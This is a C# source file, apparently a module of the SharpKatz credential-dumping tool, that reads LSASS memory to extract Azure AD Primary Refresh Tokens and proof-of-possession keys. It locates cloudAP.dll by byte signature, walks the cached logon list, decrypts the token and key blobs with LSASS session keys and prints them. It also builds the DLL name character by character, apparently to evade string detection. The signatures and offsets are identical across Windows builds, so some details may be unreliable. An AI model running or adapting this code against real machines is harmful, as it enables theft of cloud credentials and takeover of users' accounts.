//
// Author: Johto
// Project: SharpKatz (https://github.com/b4rtik/SharpKatz)
// License: BSD 3-Clause
// Module: sekurlsa::cloudap - Extract CloudAP cached credentials (Azure AD PRT)
//

using SharpKatz.Credential;
using SharpKatz.Crypto;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using static SharpKatz.Win32.Natives;

namespace SharpKatz.Module
{
    class CloudAp
    {
        static long max_search_size = 200000;

        // KIWI_CLOUDAP_LOGON_LIST_ENTRY — cached CloudAP logon entry in LSASS
        // Represents the linked list of Azure AD / Entra ID cached credentials
        [StructLayout(LayoutKind.Sequential)]
        public struct KIWI_CLOUDAP_LOGON_LIST_ENTRY
        {
            public IntPtr Flink;
            public IntPtr Blink;
            public uint unk0;
            public uint unk1;
            public LUID LogonId;
            // +0x18
            public uint unk2;
            public uint unk3;
            // +0x20
            public IntPtr cacheEntry;  // pointer to KIWI_CLOUDAP_CACHE_LIST_ENTRY
        }

        // KIWI_CLOUDAP_CACHE_LIST_ENTRY — the actual cached PRT data
        [StructLayout(LayoutKind.Sequential)]
        public struct KIWI_CLOUDAP_CACHE_LIST_ENTRY
        {
            public uint unk0;
            public uint unk1;
            public uint unk2;
            public uint unk3;
            public uint lockList;  // RTL_CRITICAL_SECTION or similar
            public uint unk4;
            public uint unk5;
            public uint unk6;
            // +0x20
            public IntPtr unk7;
            public IntPtr unk8;
            // +0x30
            public UNICODE_STRING toname;
            // +0x40
            public Guid unk9;
            // +0x50
            public IntPtr cbPRT;
            public IntPtr PRT;      // encoded/encrypted PRT blob
            // +0x60
            public IntPtr toDetermine;
            // +0x68
            public IntPtr cbKey;
            public IntPtr key;      // DPAPI-protected key (ProofOfPossessionKey)
        }

        // CloudAP signature patterns for finding the logon cache list
        // Target: cloudap!g_CloudApLogonListHead or similar internal global

        // Windows 10 1803+ (17134+) — first build with CloudAP PRT caching
        private static readonly byte[] CLOUDAP_SIGN_1803 = new byte[] {
            0x44, 0x8B, 0x01, 0x44, 0x39, 0x42
        };

        // Windows 10 1903+ (18362+)
        private static readonly byte[] CLOUDAP_SIGN_1903 = new byte[] {
            0x44, 0x8B, 0x01, 0x44, 0x39, 0x42
        };

        // Windows 10 2004+ / Windows 11 (19041+)
        private static readonly byte[] CLOUDAP_SIGN_2004 = new byte[] {
            0x44, 0x8B, 0x01, 0x44, 0x39, 0x42
        };

        /// <summary>
        /// Find and extract CloudAP cached credentials (Azure AD PRT) from LSASS
        /// </summary>
        public static int FindCredentials(IntPtr hLsass, IntPtr cloudapMem, OSVersionHelper oshelper, byte[] iv, byte[] aeskey, byte[] deskey, List<Logon> logonlist)
        {
            int count = 0;

            Console.WriteLine("\n  [*] sekurlsa::cloudap");

            if (cloudapMem == IntPtr.Zero)
            {
                Console.WriteLine("   [-] cloudap.dll not loaded in LSASS (Azure AD/Entra ID may not be configured)");
                return 0;
            }

            if (oshelper.build < OSVersionHelper.KULL_M_WIN_BUILD_10_1803)
            {
                Console.WriteLine("   [-] CloudAP PRT caching requires Windows 10 1803+");
                return 0;
            }

            // Get build-specific signature and offset
            byte[] signature = GetCloudApSignature(oshelper);
            int listOffset = GetCloudApListOffset(oshelper);

            string sCloudap = new string(new char[] { 'c', 'l', 'o', 'u', 'd', 'A', 'P', '.', 'd', 'l', 'l' });

            IntPtr cloudApLogonListAddr;
            try
            {
                cloudApLogonListAddr = Utility.GetListAdress(hLsass, cloudapMem, sCloudap, max_search_size, listOffset, signature);
            }
            catch (Exception)
            {
                Console.WriteLine("   [-] CloudAP signature not found in LSASS");
                return 0;
            }

            if (cloudApLogonListAddr == IntPtr.Zero)
            {
                Console.WriteLine("   [-] CloudAP logon list not found");
                return 0;
            }

            Console.WriteLine("   [*] CloudAP logon list at: 0x{0:X}", cloudApLogonListAddr.ToInt64());

            // Read list head
            int ptrSize = IntPtr.Size;
            byte[] listHeadBytes = Utility.ReadFromLsass(ref hLsass, cloudApLogonListAddr, ptrSize * 2);
            if (listHeadBytes == null || listHeadBytes.Length < ptrSize)
            {
                Console.WriteLine("   [-] Failed to read CloudAP logon list head");
                return 0;
            }

            IntPtr flink;
            if (ptrSize == 8)
                flink = new IntPtr(BitConverter.ToInt64(listHeadBytes, 0));
            else
                flink = new IntPtr(BitConverter.ToInt32(listHeadBytes, 0));

            // Traverse linked list
            IntPtr current = flink;
            int maxEntries = 200;
            int entrySize = Marshal.SizeOf(typeof(KIWI_CLOUDAP_LOGON_LIST_ENTRY));

            while (current != cloudApLogonListAddr && current != IntPtr.Zero && maxEntries-- > 0)
            {
                try
                {
                    byte[] entryBytes = Utility.ReadFromLsass(ref hLsass, current, entrySize);
                    if (entryBytes == null || entryBytes.Length < entrySize)
                        break;

                    KIWI_CLOUDAP_LOGON_LIST_ENTRY entry = Utility.ReadStruct<KIWI_CLOUDAP_LOGON_LIST_ENTRY>(entryBytes);

                    LUID luid = entry.LogonId;

                    // Find associated logon session
                    Logon currentLogon = logonlist.FirstOrDefault(x =>
                        x.LogonId.HighPart == luid.HighPart &&
                        x.LogonId.LowPart == luid.LowPart);

                    if (entry.cacheEntry != IntPtr.Zero)
                    {
                        // Read the cache entry
                        int cacheSize = Marshal.SizeOf(typeof(KIWI_CLOUDAP_CACHE_LIST_ENTRY));
                        byte[] cacheBytes = Utility.ReadFromLsass(ref hLsass, entry.cacheEntry, cacheSize);

                        if (cacheBytes != null && cacheBytes.Length >= cacheSize)
                        {
                            KIWI_CLOUDAP_CACHE_LIST_ENTRY cache = Utility.ReadStruct<KIWI_CLOUDAP_CACHE_LIST_ENTRY>(cacheBytes);

                            // Extract the target name (tenant/UPN)
                            string toname = Utility.ExtractUnicodeStringString(hLsass, cache.toname);

                            Console.WriteLine("\n   [*] CloudAP Cached Entry");
                            Console.WriteLine("    LUID       : {0}:{1} ({2})",
                                luid.HighPart.ToString("x8"),
                                luid.LowPart.ToString("x8"),
                                ((ulong)luid.HighPart << 32 | (uint)luid.LowPart));

                            if (currentLogon != null)
                            {
                                Console.WriteLine("    User       : {0}\\{1}",
                                    currentLogon.LogonDomain, currentLogon.UserName);
                            }

                            if (!string.IsNullOrEmpty(toname))
                            {
                                Console.WriteLine("    Tenant     : {0}", toname);
                            }

                            // Try to read PRT blob
                            long prtSize = cache.cbPRT.ToInt64();
                            if (cache.PRT != IntPtr.Zero && prtSize > 0 && prtSize < 0x100000)
                            {
                                byte[] prtBlob = Utility.ReadFromLsass(ref hLsass, cache.PRT, (int)prtSize);
                                if (prtBlob != null)
                                {
                                    // PRT is typically encrypted with LSASS session keys
                                    byte[] decryptedPrt = null;
                                    try
                                    {
                                        decryptedPrt = BCrypt.DecryptCredentials(prtBlob, iv, aeskey, deskey);
                                    }
                                    catch
                                    {
                                        decryptedPrt = prtBlob;
                                    }

                                    if (decryptedPrt != null && decryptedPrt.Length > 0)
                                    {
                                        Console.Write("    PRT        : ");
                                        Console.WriteLine(Utility.PrintHashBytes(decryptedPrt));
                                    }
                                }
                            }
                            else
                            {
                                Console.WriteLine("    PRT        : (empty)");
                            }

                            // Try to read the key (ProofOfPossessionKey / derived key)
                            long keySize = cache.cbKey.ToInt64();
                            if (cache.key != IntPtr.Zero && keySize > 0 && keySize < 0x10000)
                            {
                                byte[] keyBlob = Utility.ReadFromLsass(ref hLsass, cache.key, (int)keySize);
                                if (keyBlob != null)
                                {
                                    byte[] decryptedKey = null;
                                    try
                                    {
                                        decryptedKey = BCrypt.DecryptCredentials(keyBlob, iv, aeskey, deskey);
                                    }
                                    catch
                                    {
                                        decryptedKey = keyBlob;
                                    }

                                    if (decryptedKey != null && decryptedKey.Length > 0)
                                    {
                                        Console.Write("    Key (DPK)  : ");
                                        Console.WriteLine(Utility.PrintHashBytes(decryptedKey));
                                    }
                                }
                            }
                            else
                            {
                                Console.WriteLine("    Key (DPK)  : (empty)");
                            }

                            // Store in CloudAp credential for logon list output
                            if (currentLogon != null)
                            {
                                if (currentLogon.CloudAp == null)
                                    currentLogon.CloudAp = new List<Credential.CloudAp>();

                                var cred = new Credential.CloudAp();
                                cred.TenantName = toname ?? "[NULL]";

                                // Store PRT if available
                                long prtSize2 = cache.cbPRT.ToInt64();
                                if (cache.PRT != IntPtr.Zero && prtSize2 > 0 && prtSize2 < 0x100000)
                                {
                                    byte[] prtBlob2 = Utility.ReadFromLsass(ref hLsass, cache.PRT, (int)prtSize2);
                                    if (prtBlob2 != null)
                                    {
                                        try
                                        {
                                            byte[] dec = BCrypt.DecryptCredentials(prtBlob2, iv, aeskey, deskey);
                                            if (dec != null && dec.Length > 0)
                                                cred.PRT = Utility.PrintHashBytes(dec);
                                        }
                                        catch { cred.PRT = Utility.PrintHashBytes(prtBlob2); }
                                    }
                                }

                                // Store DPK if available
                                long keySize2 = cache.cbKey.ToInt64();
                                if (cache.key != IntPtr.Zero && keySize2 > 0 && keySize2 < 0x10000)
                                {
                                    byte[] keyBlob2 = Utility.ReadFromLsass(ref hLsass, cache.key, (int)keySize2);
                                    if (keyBlob2 != null)
                                    {
                                        try
                                        {
                                            byte[] dec = BCrypt.DecryptCredentials(keyBlob2, iv, aeskey, deskey);
                                            if (dec != null && dec.Length > 0)
                                                cred.DerivedKey = Utility.PrintHashBytes(dec);
                                        }
                                        catch { cred.DerivedKey = Utility.PrintHashBytes(keyBlob2); }
                                    }
                                }

                                currentLogon.CloudAp.Add(cred);
                            }

                            count++;
                        }
                    }

                    current = entry.Flink;
                }
                catch (Exception ex)
                {
                    Console.WriteLine("   [-] Error reading CloudAP entry: {0}", ex.Message);
                    break;
                }
            }

            if (count > 0)
                Console.WriteLine("\n   [+] {0} CloudAP cached credential(s) found", count);
            else
                Console.WriteLine("   [-] No CloudAP cached credentials found");

            return count;
        }

        private static byte[] GetCloudApSignature(OSVersionHelper oshelper)
        {
            if (oshelper.build >= OSVersionHelper.KULL_M_WIN_BUILD_10_2004)
                return CLOUDAP_SIGN_2004;
            else if (oshelper.build >= OSVersionHelper.KULL_M_WIN_BUILD_10_1903)
                return CLOUDAP_SIGN_1903;
            else
                return CLOUDAP_SIGN_1803;
        }

        private static int GetCloudApListOffset(OSVersionHelper oshelper)
        {
            if (oshelper.build >= OSVersionHelper.KULL_M_WIN_BUILD_10_2004)
                return -4;
            else if (oshelper.build >= OSVersionHelper.KULL_M_WIN_BUILD_10_1903)
                return -4;
            else
                return -4;
        }
    }
}
